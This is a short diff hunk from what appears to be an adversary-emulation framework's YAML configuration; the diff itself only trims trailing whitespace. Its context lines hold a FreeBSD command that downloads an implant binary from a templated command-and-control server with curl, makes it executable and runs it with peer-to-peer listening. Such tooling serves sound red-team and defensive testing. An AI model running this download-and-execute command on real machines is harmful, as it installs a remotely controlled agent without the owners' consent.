@@ -79,7 +79,7 @@
               server="#{app.contact.http}";
               curl -s -X POST -H "file:sandcat.go" -H "platform:freebsd" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
               chmod +x #{agents.implant_name};
-              ./#{agents.implant_name} -server $server -listenP2P -v 
+              ./#{agents.implant_name} -server $server -listenP2P -v
     linux:
       sh:
         command: |
